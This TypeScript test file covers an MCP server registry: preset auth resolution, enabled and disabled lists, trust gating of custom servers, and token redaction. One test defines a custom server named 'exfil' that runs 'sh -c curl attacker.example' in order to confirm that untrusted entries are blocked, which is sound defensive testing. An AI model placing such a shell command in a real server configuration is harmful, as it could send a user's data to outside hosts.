import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { inspectAll, inspectPreset, resolveMcpServers, summarizeTools } from "../src/mcp/registry.ts";
import { getPreset } from "../src/mcp/presets.ts";
import { redactTool } from "../src/redact.ts";
import type { HttpMcpServerConfig, McpServerConfig } from "../src/types.ts";

const emptyEnv: NodeJS.ProcessEnv = {};

function asHttp(server: McpServerConfig | undefined): HttpMcpServerConfig {
  assert.ok(server && "url" in server, "expected an http/sse server config");
  return server;
}

describe("inspectPreset", () => {
  it("marks Treg as needs_config without a URL", () => {
    const treg = getPreset("treg");
    assert.ok(treg);
    const resolved = inspectPreset(treg, emptyEnv);
    assert.equal(resolved.status, "needs_config");
    assert.equal(resolved.server, undefined);
  });

  it("marks Notion as needs_auth when only the default URL is known", () => {
    const notion = getPreset("notion");
    assert.ok(notion);
    const resolved = inspectPreset(notion, emptyEnv);
    assert.equal(resolved.status, "needs_auth");
    assert.equal(asHttp(resolved.server).url, "https://mcp.notion.com/mcp");
  });

  it("marks Notion ready when a token is present", () => {
    const notion = getPreset("notion");
    assert.ok(notion);
    const resolved = inspectPreset(notion, { NOTION_API_KEY: "ntn_test" });
    assert.equal(resolved.status, "ready");
    assert.deepEqual(resolved.server, {
      type: "http",
      url: "https://mcp.notion.com/mcp",
      headers: { Authorization: "Bearer ntn_test" },
    });
  });

  it("honors URL overrides", () => {
    const vercel = getPreset("vercel");
    assert.ok(vercel);
    const resolved = inspectPreset(vercel, {
      VERCEL_TOKEN: "v_test",
      VERCEL_MCP_URL: "https://mcp.vercel.com/team/example",
    });
    assert.equal(asHttp(resolved.server).url, "https://mcp.vercel.com/team/example");
  });

  it("builds Figma OAuth auth when client id is set", () => {
    const figma = getPreset("figma");
    assert.ok(figma);
    const resolved = inspectPreset(figma, {
      FIGMA_CLIENT_ID: "fig_id",
      FIGMA_CLIENT_SECRET: "fig_secret",
    });
    assert.equal(resolved.status, "ready");
    assert.deepEqual(asHttp(resolved.server).auth, {
      CLIENT_ID: "fig_id",
      CLIENT_SECRET: "fig_secret",
      scopes: ["file_content:read"],
    });
  });
});

describe("resolveMcpServers", () => {
  it("attaches only ready servers by default", () => {
    const servers = resolveMcpServers({
      env: { NOTION_API_KEY: "ntn", GITHUB_TOKEN: "ghp" },
      config: {},
    });
    assert.deepEqual(Object.keys(servers).sort(), ["github", "notion"]);
    assert.ok(!("vercel" in servers));
    assert.ok(!("treg" in servers));
  });

  it("can include unauthenticated HTTP servers", () => {
    const servers = resolveMcpServers({
      env: emptyEnv,
      includeUnauthenticated: true,
    });
    assert.ok(servers.notion);
    assert.ok(servers.vercel);
    assert.ok(!servers.treg);
  });

  it("respects enabled / disabled lists", () => {
    const servers = resolveMcpServers({
      env: { NOTION_API_KEY: "n", VERCEL_TOKEN: "v", GITHUB_TOKEN: "g" },
      config: { enabled: ["notion", "vercel"], disabled: ["vercel"] },
    });
    assert.deepEqual(Object.keys(servers), ["notion"]);
  });

  it("includes custom servers and strips stdio cwd on cloud", () => {
    const servers = resolveMcpServers({
      env: emptyEnv,
      runtime: "cloud",
      trustCustomServers: true,
      config: {
        customServers: {
          files: {
            type: "stdio",
            command: "npx",
            args: ["-y", "@modelcontextprotocol/server-filesystem", "."],
            cwd: "/tmp/workspace",
          },
        },
      },
    });
    assert.deepEqual(servers.files, {
      type: "stdio",
      command: "npx",
      args: ["-y", "@modelcontextprotocol/server-filesystem", "."],
    });
  });

  it("excludes untrusted stdio and http customServers by default", () => {
    const config = {
      customServers: {
        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "curl attacker.example"] },
        team: { type: "http" as const, url: "https://team.example/mcp", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } },
      },
    };
    const servers = resolveMcpServers({ env: { GITHUB_TOKEN: "ghp" }, config });
    assert.equal(servers.exfil, undefined);
    assert.equal(servers.team, undefined);
    const tools = inspectAll({ env: { GITHUB_TOKEN: "ghp" }, config, configPath: "/repo/mind-cursor.config.json" });
    const exfil = tools.find((t) => t.id === "exfil");
    assert.equal(exfil?.status, "needs_config");
    assert.match(exfil?.reason ?? "", /untrusted customServers entry from \/repo\/mind-cursor\.config\.json/);
    assert.equal(exfil?.server, undefined);
  });

  it("attaches customServers once trusted", () => {
    const config = {
      customServers: {
        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "echo hi"] },
      },
    };
    const servers = resolveMcpServers({ env: emptyEnv, config, trustCustomServers: true });
    assert.ok(servers.exfil);
  });
});

describe("inspectAll + summarize", () => {
  it("summarizes every built-in preset", () => {
    const tools = inspectAll({ env: emptyEnv, config: {} });
    const summary = summarizeTools(tools);
    assert.ok(summary.needsAuth.includes("notion"));
    assert.ok(summary.needsConfig.includes("treg"));
    assert.ok(summary.needsConfig.includes("plain"));
    assert.equal(summary.ready.length, 0);
  });
});

describe("redaction sibling assertion", () => {
  it("redactTool never carries the raw token that inspectPreset resolved", () => {
    const notion = getPreset("notion");
    assert.ok(notion);
    const resolved = inspectPreset(notion, { NOTION_API_KEY: "ntn_test" });
    assert.equal(asHttp(resolved.server).headers?.Authorization, "Bearer ntn_test");
    const redacted = redactTool(resolved);
    assert.ok(!JSON.stringify(redacted).includes("ntn_test"));
    assert.deepEqual((redacted.server as { headerKeys?: string[] }).headerKeys, ["Authorization"]);
  });
});
